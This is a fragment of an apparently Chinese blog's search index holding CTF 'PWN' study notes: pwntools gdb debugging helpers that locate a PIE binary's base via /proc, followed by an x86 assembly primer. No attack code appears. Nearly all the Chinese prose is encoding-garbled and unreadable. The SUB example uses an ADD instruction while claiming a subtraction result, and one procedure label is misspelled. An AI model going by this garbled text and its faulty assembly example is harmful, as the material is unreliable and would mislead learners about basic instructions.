ã€x/40wxè¡¨ç¤ºæŸ¥çœ‹40ä¸ªåœ°å€ä¸­çš„å†…å­˜æ•°æ®ã€‘</p><p>ä»£ç å®ç°ï¼š</p><p>ç¨‹åºæ²¡æœ‰å¼€å¯åœ°å€éšæœºåŒ–ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def debug(addr):</span><br><span class="line">    raw_input(&#39;debug:&#39;)</span><br><span class="line">    gdb.attach(r, &quot;b *&quot; + addr)</span><br></pre></td></tr></table></figure><p>åœ¨ç¨‹åºè¿è¡Œæ—¶è°ƒç”¨è¿™ä¸ªå‡½æ•°å°±å¯ä»¥è°ƒè¯•äº† </p><p><img src="/images/Linux5.png" alt="Linux5"></p><p>ç¨‹åºå¼€å¯åœ°å€éšæœºåŒ–ï¼š(çœ‹ä¸æ‡‚ã€‚ã€‚)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">wordSz &#x3D; 4</span><br><span class="line">hwordSz &#x3D; 2</span><br><span class="line">bits &#x3D; 32</span><br><span class="line">PIE &#x3D; 0</span><br><span class="line">mypid&#x3D;0</span><br><span class="line">def leak(address, size):</span><br><span class="line">   with open(&#39;&#x2F;proc&#x2F;%s&#x2F;mem&#39; % mypid) as mem:</span><br><span class="line">      mem.seek(address)</span><br><span class="line">      return mem.read(size)</span><br><span class="line"></span><br><span class="line">def findModuleBase(pid, mem):</span><br><span class="line">   name &#x3D; os.readlink(&#39;&#x2F;proc&#x2F;%s&#x2F;exe&#39; % pid)</span><br><span class="line">   with open(&#39;&#x2F;proc&#x2F;%s&#x2F;maps&#39; % pid) as maps:</span><br><span class="line">      for line in maps:</span><br><span class="line">         if name in line:</span><br><span class="line">            addr &#x3D; int(line.split(&#39;-&#39;)[0], 16)</span><br><span class="line">            mem.seek(addr)</span><br><span class="line">            if mem.read(4) &#x3D;&#x3D; &quot;\x7fELF&quot;:</span><br><span class="line">               bitFormat &#x3D; u8(leak(addr + 4, 1))</span><br><span class="line">               if bitFormat &#x3D;&#x3D; 2:</span><br><span class="line">                  global wordSz</span><br><span class="line">                  global hwordSz</span><br><span class="line">                  global bits</span><br><span class="line">                  wordSz &#x3D; 8</span><br><span class="line">                  hwordSz &#x3D; 4</span><br><span class="line">                  bits &#x3D; 64</span><br><span class="line">               return addr</span><br><span class="line">   log.failure(&quot;Module&#39;s base address not found.&quot;)</span><br><span class="line">   sys.exit(1)</span><br><span class="line"></span><br><span class="line">def debug(addr &#x3D; 0):</span><br><span class="line">    global mypid</span><br><span class="line">    mypid &#x3D; proc.pidof(r)[0]</span><br><span class="line">    raw_input(&#39;debug:&#39;)</span><br><span class="line">    with open(&#39;&#x2F;proc&#x2F;%s&#x2F;mem&#39; % mypid) as mem:</span><br><span class="line">        moduleBase &#x3D; findModuleBase(mypid, mem)</span><br><span class="line">        gdb.attach(r, &quot;set follow-fork-mode parent\nb *&quot; + hex(moduleBase+addr))</span><br></pre></td></tr></table></figure><p>ç”±äºå¼€å¯åœ°å€éšæœºåŒ–ä¹‹åida proæ‰“å¼€ç¨‹åºåï¼Œæ˜¾ç¤ºçš„æ˜¯ç¨‹åºçš„åç§»åœ°å€ï¼Œè€Œä¸æ˜¯å®é™…çš„åœ°å€ï¼Œå½“ç¨‹åºåŠ è½½åç¨‹åºçš„ç¨‹åºçš„å®é™…åœ°å€æ˜¯ï¼šåŸºåœ°å€+åç§»åœ°å€ï¼Œè°ƒç”¨debugå‡½æ•°çš„æ—¶å€™åªè¦æŠŠåç§»åœ°å€ä¼ é€’è¿›å»å°±å¥½</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†ç‚¹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ±‡ç¼–åŸºç¡€æ€»ç»“</title>
      <link href="/2021/01/21/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/"/>
      <url>/2021/01/21/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<hr><h1><span id="cpuæ¶æ„ä¸æŒ‡ä»¤é›†">CPUæ¶æ„ä¸æŒ‡ä»¤é›†</span></h1><p><strong>CPU</strong>ï¼šä»å†…å­˜ä¸­è¯»å–æŒ‡ä»¤ï¼Œå†è§£ç å’Œæ‰§è¡Œ</p><p><strong>æŒ‡ä»¤é›†</strong>ï¼šæ“ä½œç +ç‰¹å®šCPUæ‰§è¡Œçš„åŸºæœ¬å‘½ä»¤ï¼›ä¸€å †äºŒè¿›åˆ¶æ•°æ®ï¼›åˆ†ä¸ºCISCä¸RISCä¸¤ç§</p><p><strong>æ±‡ç¼–ã€æŒ‡ä»¤é›†ä¹‹é—´çš„å…³ç³»</strong>ï¼š</p><p>â€‹    äºŒè¿›åˆ¶æ•°æ®ä¸åˆ©äºé˜…è¯»ä¸ç†è§£ï¼Œäºæ˜¯æ±‡ç¼–è¯­è¨€è¯ç”Ÿï¼Œæ¯æ¡æ±‡ç¼–æŒ‡ä»¤éƒ½æœ‰å¯¹åº”çš„æŒ‡ä»¤</p><h2><span id="ciscä¸riscå¯¹æ¯”">CISCä¸RISCå¯¹æ¯”</span></h2><p><strong>CISCï¼ˆx86ï¼‰</strong>  ï¼šæŒ‡ä»¤é•¿åº¦ä¸å›ºå®šï¼ˆ1~6å­—èŠ‚ã€32ä½ã€‘ï¼‰ï¼›æŒ‡ä»¤æ•°é‡ç›¸å¯¹æ›´å¤šï¼ˆè¯´ç™½äº†æ›´è®²ç©¶ï¼‰ï¼›å¯»å€æ–¹å¼å¤šæ ·ï¼›                            é€šç”¨å¯„å­˜å™¨æ›´å°‘ï¼›</p><p>â€‹                            ç¼ºç‚¹ï¼šåç¼–è¯‘ä¼šæŒ‡ä»¤é”™ä½ï¼›</p><p><strong>RISCï¼ˆARMï¼‰</strong>ï¼šæŒ‡ä»¤é•¿åº¦å›ºå®šï¼ˆ4å­—èŠ‚ã€32ä½ã€‘ï¼‰ï¼›æŒ‡ä»¤æ•°é‡ç›¸å¯¹è¾ƒå°‘éœ€è¦ç»„åˆï¼ˆæ²¡é‚£ä¹ˆè®²ç©¶ï¼‰ï¼›å¯»å€æ–¹å¼å•                            ä¸€ï¼›é€šç”¨å¯„å­˜å™¨æ›´å¤šï¼›</p><p>â€‹                            ä¼˜ç‚¹ï¼šæœ‰åˆ©äºè§£ç å’Œä¼˜åŒ–ï¼Œå¯ä»¥å®ç°æµæ°´çº¿ï¼›</p><p>â€‹                            ç¼ºç‚¹ï¼šå¹³å‡ä»£ç æ›´é•¿ï¼Œå ç©ºé—´</p><hr><h1><span id="x86x64-æ±‡ç¼–åŸºç¡€">x86/x64 æ±‡ç¼–åŸºç¡€</span></h1><h2><span id="cpuæ“ä½œæ¨¡å¼">CPUæ“ä½œæ¨¡å¼</span></h2><p><strong>ä¿æŠ¤æ¨¡å¼</strong>ï¼šç±»ä¼¼è™šæ‹Ÿæœºï¼›æ‰€æœ‰æŒ‡ä»¤å’Œç‰¹æ€§éƒ½å¯ç”¨ï¼Œä½†åªèƒ½åœ¨åˆ†é…çš„å†…å­˜æ®µä½¿ç”¨</p><p><strong>å®åœ°å€æ¨¡å¼</strong>ï¼šç›´æ¥è®¿é—®ç¡¬ä»¶åŠå…¶å®é™…å†…å­˜åœ°å€ï¼ˆç±»ä¼¼äºç›´æ¥åœ¨cmdé‡Œæ“ä½œã€‚ã€‚ã€‚ã€‚å§ï¼Ÿï¼Ÿï¼‰</p><p><strong>ç³»ç»Ÿç®¡ç†æ¨¡å¼</strong>ï¼šæä¾›ç”µæºç®¡ç†æˆ–å®‰å…¨ä¿æŠ¤ç‰¹æ€§æœºåˆ¶ï¼ˆæ›´ä¸ªæ€§åŒ–ï¼Ÿï¼Ÿï¼‰</p><h2><span id="è¯­æ³•é£æ ¼">è¯­æ³•é£æ ¼</span></h2><p>x86ï¼šAT&amp;Té£æ ¼å’ŒIntelé£æ ¼</p><h2><span id="å¯„å­˜å™¨ä¸æ•°æ®ç±»å‹">å¯„å­˜å™¨ä¸æ•°æ®ç±»å‹</span></h2><h2><span id="å¯„å­˜å™¨">å¯„å­˜å™¨</span></h2><table><thead><tr><th>æ“ä½œæ•°</th><th>å¯ç”¨å¯„å­˜å™¨åç§°</th></tr></thead><tbody><tr><td>32ä½</td><td>EAXã€EBXã€ECXã€EDXã€EDIã€ESIã€EBPã€ESPã€R8D~R15D</td></tr><tr><td>64ä½</td><td>RAXã€RBXã€RCXã€RDXã€RDIã€RSIã€RBPã€RSPã€R8~R15</td></tr></tbody></table><p>æ³¨æ„ï¼š64ä½æ¨¡å¼ä¸‹ï¼Œæ“ä½œæ•°è¿˜æ˜¯é»˜è®¤ä½32ä½ï¼Œæœ‰8ä¸ªé€šç”¨å¯„å­˜å™¨ï¼›å½“ç»™æŒ‡ä»¤åŠ ä¸ŠREXï¼ˆå¯„å­˜å™¨æ‰©å±•ï¼‰å‰ç¼€åï¼Œæ“ä½œæ•°æ‰å˜ä¸º64ä½ï¼Œæ·»åŠ 8ä¸ªå¸¦æ ‡å·çš„é€šç”¨å¯„å­˜å™¨ï¼ˆR8~R15ï¼‰</p><p>64ä½å¤„ç†å™¨ç‰¹ç‚¹ï¼š</p><ol><li>64ä½ä¸32ä½æœ‰ç›¸åŒçš„æ ‡å¿—ä½çŠ¶æ€ï¼›</li><li>64ä½æ¨¡å¼ä¸‹ä¸èƒ½è®¿é—®é€šç”¨å¯„å­˜å™¨çš„é«˜ä½å­—èŠ‚ï¼ˆå¦‚AHã€BHã€CHã€DHï¼‰;</li></ol><h2><span id="æ•°æ®ç±»å‹">æ•°æ®ç±»å‹</span></h2><ul><li><p>æ•´æ•°ï¼š1234è¿™ç§è¦æœ‰åç¼€è¡¨æ˜æ˜¯ä»€ä¹ˆè¿›åˆ¶çš„æ•°ï¼›</p><p>â€‹            ABCDè¿™ç§åå…­è¿›åˆ¶è¦åœ¨ä»¥å­—æ¯å¼€å¤´çš„åå…­è¿›åˆ¶æ•°å‰åŠ 0è¡¨ç¤ºï¼Œå¦‚0ABCDhï¼›</p></li><li><p>æµ®ç‚¹æ•°ï¼šä»¥åè¿›åˆ¶è¡¨ç¤ºï¼›ä»¥åå…­è¿›åˆ¶ç¼–ç </p></li><li><p>å­—ç¬¦ä¸²å¸¸é‡ï¼šå…è®¸å­—ç¬¦ä¸²å¸¸é‡çš„åµŒå¥—ï¼ˆå¦‚ â€˜he says â€œhelloâ€â€˜ï¼‰;åœ¨å†…å­˜ä¸­ä»¥æ•´æ•°å­—èŠ‚åºåˆ—ä¿å­˜</p></li></ul><h2><span id="æ•°æ®ä¼ é€ä¸è®¿é—®">æ•°æ®ä¼ é€ä¸è®¿é—®</span></h2><p><strong>MOVæŒ‡ä»¤</strong>ï¼šMOV  EAX,ECX  è¡¨ç¤ºå°†ECXå¯„å­˜å™¨çš„å€¼æ‹·è´è¿›EAX (ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç›®çš„æ“ä½œæ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºæºæ“ä½œæ•°)</p><p>â€‹    å¦‚æœå‡ºç°å°æ“ä½œæ•°ï¼ˆ32ï¼‰æ‰©å±•ä¸ºå¤§æ“ä½œæ•°ï¼ˆ64ï¼‰çš„æƒ…å†µï¼Œéœ€è¦å¯¹æ“ä½œæ•°è¿›è¡Œå…¨é›¶æ‰©å±•æˆ–ç¬¦å·æ‰©å±•</p><p><strong>XCHGæŒ‡ä»¤</strong>ï¼šäº¤æ¢ä¸¤ä¸ªæ“ä½œæ•°çš„å€¼ï¼ˆæ“ä½œæ•°æ•°æ®ç±»å‹è¦ç›¸åŒï¼‰</p><p>å˜é‡å+åç§»é‡å¯è¡¨ç¤ºä¸€ä¸ªç›´æ¥åç§»é‡æ“ä½œæ•°ï¼ˆç®¡ä»–æœ‰æ²¡æœ‰çœ‹æ‡‚æ¦‚å¿µçœ‹ä¾‹å­å°±å®Œäº‹å„¿ï¼‰</p><p>å¦‚ä¸‹è¡¨ç¤ºä¸€ä¸ªæ•°ç»„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">testArray BYTE 99h,98h,97h,96h</span><br><span class="line">.code</span><br><span class="line">MOV al, testArray             ; al&#x3D;99h</span><br><span class="line">MOV bl, [testArray+1]         ; bl&#x3D;98h</span><br><span class="line">MOV cl, [testArray+2]         ; cl&#x3D;97h</span><br></pre></td></tr></table></figure><h2><span id="ç®—æœ¯è¿ç®—ä¸é€»è¾‘è¿ç®—">ç®—æœ¯è¿ç®—ä¸é€»è¾‘è¿ç®—</span></h2><p><strong>è¡¥ç </strong>ï¼šè®¡ç®—æœºåº•å±‚æ•°æ®éƒ½æ˜¯ä»¥è¡¥ç å½¢å¼è¡¨ç¤ºï¼›</p><p>â€‹            ä¸¤æœºå™¨æ•°ç›¸åŠ çš„è¡¥ç =å…ˆæ±‚è¡¥ç å†ç›¸åŠ ï¼›</p><p>â€‹            åŠ æ³•è¿ç®—å¯å°†ç¬¦å·ä½å’Œæ•°å€¼ä¸ºä¸€èµ·ç®—ï¼ˆç¬¦å·ä½æœ‰è¿›ä½åˆ™ç›´æ¥èˆå¼ƒï¼‰ï¼›</p><p>â€‹            å‡æ³•è¿ç®—åˆ©ç”¨å…¶ç›¸åæ•°çš„åŠ æ³•å®ç°ï¼›</p><p><strong>INCæŒ‡ä»¤</strong>ï¼šæ“ä½œæ•°+1</p><p><strong>DECæŒ‡ä»¤</strong>ï¼šæ“ä½œæ•°-1</p><p><strong>ADDæŒ‡ä»¤</strong>ï¼šå°†é•¿åº¦ç›¸åŒçš„æ“ä½œæ•°è¿›è¡Œç›¸åŠ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">testData DWORD 10000h</span><br><span class="line">testData2 DWORD 20000h</span><br><span class="line">.code</span><br><span class="line">MOV EAX,testData   ; EAX&#x3D;10000h</span><br><span class="line">ADD EAX,testData2  ; EAX&#x3D;30000h</span><br></pre></td></tr></table></figure><p><strong>SUBæŒ‡ä»¤</strong>ï¼šä»ç›®çš„æ“ä½œæ•°ä¸­å‡å»æºæ“ä½œæ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">testData DWORD 20000h</span><br><span class="line">testData2 DWORD 10000h</span><br><span class="line">.code</span><br><span class="line">MOV EAX,testData   ; EAX&#x3D;20000h</span><br><span class="line">ADD EAX,testData2  ; EAX&#x3D;10000h</span><br></pre></td></tr></table></figure><p><strong>NEGæŒ‡ä»¤</strong>ï¼šå°†æ“ä½œæ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶è¡¥ç ï¼Œå¹¶å°†ç¬¦å·ä½å–å</p><h2><span id="è·³è½¬æŒ‡ä»¤ä¸å¾ªç¯æŒ‡ä»¤">è·³è½¬æŒ‡ä»¤ä¸å¾ªç¯æŒ‡ä»¤</span></h2><p>è·³è½¬æŒ‡ä»¤ç±»å‹ï¼šæ¡ä»¶è·³è½¬å’Œæ— æ¡ä»¶è·³è½¬</p><p><strong>JMPæŒ‡ä»¤</strong>ï¼šæ— æ¡ä»¶è·³è½¬ï¼›éœ€è¦ç”¨æ ‡å·æ¥æ ‡è¯†ï¼Œæ±‡ç¼–æ—¶ä¼šå°†æ ‡å·è½¬æ¢ä½ç›¸åº”çš„åç§»é‡ï¼›æ ‡å·å’Œ JMPæŒ‡ä»¤è¦å†åŒä¸€å‡½                  æ•°ä¸­ï¼Œä½†å…¨å±€æ ‡å·ä¸å—é™åˆ¶ã€‚ï¼ˆå’Œgotoè¯­å¥æœ‰ç‚¹åƒï¼‰</p><p>â€‹                ä¸‹é¢ç¨‹åºå…ˆç»™EAXèµ‹å€¼å†ç»™EBXèµ‹å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JMP labell</span><br><span class="line">MOV EBX, 0</span><br><span class="line">labell:</span><br><span class="line">MOV EAX, 0</span><br></pre></td></tr></table></figure><p>â€‹                å½“åœ¨å¾ªç¯ç»“æŸæ—¶ç”¨JMPæŒ‡ä»¤è·³å›å¾ªç¯å¼€å§‹ä½ç½®å¯å®ç°æ— é™å¾ªç¯</p><p><strong>LOOPæŒ‡ä»¤</strong>ï¼šåˆ›å»ºä¸€ä¸ªå¾ªç¯ä»£ç å—</p><p>â€‹                     ECXå¯„å­˜å™¨ä¸ºå¾ªç¯çš„è®¡æ•°å™¨ï¼Œå¾ªç¯ä¸€æ¬¡ï¼ŒECXå€¼-1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MOV AX, 0</span><br><span class="line">MOV ECX, 3</span><br><span class="line">L1:</span><br><span class="line">INC AX</span><br><span class="line">LOOP L1</span><br><span class="line">XOR EAX, EBX</span><br></pre></td></tr></table></figure><p>â€‹    LOOPæŒ‡ä»¤åˆ†ä¸ºä¸¤æ­¥ï¼šç¬¬ä¸€æ­¥å°†ECX -1ï¼›ç¬¬äºŒæ­¥å°†ECXä¸0æ¯”è¾ƒï¼Œå¦‚æœECXä¸ä¸º0ï¼Œè·³è½¬åˆ°æ ‡å·åœ°å€å¤„ï¼ˆINC                 AXï¼‰ï¼›å¦‚æœECXä¸º0ï¼Œåˆ™ä¸è·³è½¬ï¼Œæ‰§è¡ŒLOOPä¸‹ä¸€æ¡æŒ‡ä»¤ï¼ˆXOR   EAXï¼ŒEBXï¼‰</p><p>â€‹    å¦‚æœECXçš„åˆå§‹å€¼ä¸º0ï¼Œé‚£ä¹ˆæ‰§è¡ŒLOOPæŒ‡ä»¤æ—¶ï¼ŒECX -1å˜ä¸ºFFFFFFFFhï¼Œæ˜¯ä¸ªå¾ˆå¤§çš„å¾ªç¯ï¼Œå› æ­¤åœ¨ç¼–å†™x86æ±‡ç¼–è¯­è¨€æ—¶ä¸€èˆ¬æƒ…å†µä¸éœ€è¦æ˜¾å¼åœ°æ”¹å˜ECXçš„å€¼ï¼Œç‰¹åˆ«æ˜¯å­˜åœ¨å¾ªç¯åµŒå¥—çš„æƒ…å†µæ—¶ã€‚ï¼ˆä¸æ‡‚ã€‚ã€‚ï¼‰</p><h2><span id="æ ˆä¸å‡½æ•°è°ƒç”¨">æ ˆä¸å‡½æ•°è°ƒç”¨</span></h2><p><strong>æ ˆ</strong>ï¼šç‰¹ç‚¹ï¼šå…ˆå…¥åå‡ºï¼ˆå¯ä»¥æƒ³è±¡æˆä¸€ä¸ªè–¯ç‰‡æ¡¶ï¼‰</p><pre><code>   ç”¨é€”ï¼šå­˜å‚¨å±€éƒ¨å˜é‡ï¼›æ‰§è¡ŒCALLæŒ‡ä»¤è°ƒç”¨å‡½æ•°æ—¶ï¼Œä¿å­˜å‡½æ•°åœ°å€ä»¥ä¾¿å‡½æ•°ç»“æŸæ—¶æ­£ç¡®è¿”å›ï¼›ä¼ é€’å‡½æ•°å‚æ•°</code></pre><p>â€‹       å¸¸ç”¨æŒ‡ä»¤ï¼š</p><p>â€‹            PUSHæŒ‡ä»¤ï¼šå…¥æ ˆï¼›å¯¹ESP/RSP/SPå¯„å­˜å™¨çš„å€¼å‡å» 4ï¼ˆ32ä½ï¼‰æˆ– 8ï¼ˆ64ä½ï¼‰ï¼Œå°†æ“ä½œæ•°å†™å…¥å¯„å­˜å™¨ä¸­æŒ‡é’ˆ                                æŒ‡å‘çš„å†…å­˜ä¸­</p><p>â€‹            POPæŒ‡ä»¤  ï¼šå‡ºæ ˆï¼›æ˜¯PUSHæŒ‡ä»¤çš„é€†æ“ä½œï¼›å…ˆä»ESPç­‰å¯„å­˜å™¨æŒ‡å‘çš„å†…å­˜ä¸­è¯»å–æ•°æ®å†™å…¥å…¶ä»–å†…å­˜åœ°å€æˆ–                                å¯„å­˜å™¨ï¼Œå†å°†å¯„å­˜å™¨çš„å€¼åŠ ä¸Š 4ï¼ˆ32ä½ï¼‰æˆ– 8ï¼ˆ64ä½ï¼‰</p><p>â€‹        <strong>ï¼ˆè¯´ç™½äº†ï¼šPUSH  AX è¡¨ç¤ºå°†å¯„å­˜å™¨AXä¸­çš„æ•°æ®é€å…¥æ ˆä¸­ï¼›POP AX è¡¨ç¤ºä»æ ˆé¡¶å–å‡ºæ•°æ®é€å…¥AXï¼‰</strong></p><p>ä¸‹æ–¹ä»£ç é€šè¿‡æ ˆå®ç°EAXä¸EBXå€¼çš„äº¤æ¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MOV EAX, 1234h</span><br><span class="line">   MOV EBX, 5678h</span><br><span class="line">   PUSH EAX</span><br><span class="line">   PUSH EBX</span><br><span class="line">   POP EAX</span><br><span class="line">   POP EBX</span><br></pre></td></tr></table></figure><h3><span id="ä½¿ç”¨æ ˆä¿å­˜å‡½æ•°ä¿å­˜åœ°å€">ä½¿ç”¨æ ˆä¿å­˜å‡½æ•°ä¿å­˜åœ°å€</span></h3><p><strong>CALLæŒ‡ä»¤</strong>ï¼šè°ƒç”¨å­å‡½æ•°ï¼›è°ƒç”¨æ—¶ï¼ŒCALLæŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€å°†ä½œä¸ºè¿”å›åœ°å€è¢«ä¿å­˜åœ¨æ ˆä¸­ï¼Œå½“è°ƒç”¨å‡½æ•°ç»“æŸ                æ—¶ï¼Œæ‰§è¡ŒRETæŒ‡ä»¤è·³è½¬åˆ°è¿”å›åœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">....code</span><br><span class="line">...main PROC</span><br><span class="line">0x00008000  MOV EBX, EAX</span><br><span class="line">......</span><br><span class="line">0X00008020  CALL testFunc</span><br><span class="line">0x00008025  MOV EAX, EBX</span><br><span class="line">......</span><br><span class="line">...main ENDP</span><br><span class="line">......</span><br><span class="line">0x00008A00  testFunc PROC</span><br><span class="line">...MOV EAX, EDX</span><br><span class="line">......</span><br><span class="line">...RET</span><br><span class="line">...textFunc ENDP</span><br></pre></td></tr></table></figure><p>æ³¨ï¼šprocæ˜¯å®šä¹‰å­ç¨‹åºçš„ä¼ªæŒ‡ä»¤ï¼Œä½ç½®åœ¨å­ç¨‹åºçš„å¼€å§‹å¤„ï¼Œå®ƒå’Œendpåˆ†åˆ«è¡¨ç¤ºå­ç¨‹åºå®šä¹‰çš„å¼€å§‹å’Œç»“æŸä¸¤è€…å¿…é¡»æˆå¯¹å‡ºç°ã€‚</p><p>å½“CALLæŒ‡ä»¤æ‰§è¡Œæ—¶ï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ï¼ˆ0x00008025ï¼‰è¢«å‹å…¥æ ˆä¸­ï¼Œè¢«è°ƒç”¨å‡½æ•°testFuncåœ°å€0x00008A00è¢«åŠ è½½è¿›EIPå¯„å­˜å™¨ï¼ˆEIPå¯„å­˜å™¨å­˜æ”¾  ä¸‹ä¸€ä¸ªCPUæŒ‡ä»¤å­˜æ”¾çš„å†…å­˜åœ°å€ï¼‰</p><p>   æ‰§è¡ŒRETæŒ‡ä»¤æ—¶ï¼ŒESPæŒ‡å‘çš„æ•°æ®å¼¹å‡ºè‡³EIPï¼›ESPæ•°å€¼å¢åŠ æŒ‡å‘æ ˆä¸­ä¸Šä¸€ä¸ªå€¼</p><h3><span id="ä½¿ç”¨æ ˆä¼ é€’å‡½æ•°å‚æ•°">ä½¿ç”¨æ ˆä¼ é€’å‡½æ•°å‚æ•°</span></h3><p>cdeclçº¦å®šï¼š</p><p>â€‹            å‡è®¾å‡½æ•° func æœ‰ä¸‰ä¸ªå‚æ•° agr1ã€agr2ã€agr3 ï¼Œåœ¨cdeclçº¦å®šä¸‹é€šå¸¸ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push arg3</span><br><span class="line">push arg2</span><br><span class="line">push arg1</span><br><span class="line">call func</span><br></pre></td></tr></table></figure><p>ï¼ˆåªçŸ¥é“è¿™ä¹ˆå¤šäº†ã€‚ã€‚ã€‚ï¼‰</p><h3><span id="ä½¿ç”¨æ ˆå­˜å‚¨å˜é‡">ä½¿ç”¨æ ˆå­˜å‚¨å˜é‡</span></h3><p>æ¶‰åŠåˆ°äº†PUSHFDå’ŒPOPFDï¼Œä½†è®²çš„å¾ˆå°‘å°±æ²¡æ€ä¹ˆçœ‹æ‡‚</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†ç‚¹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
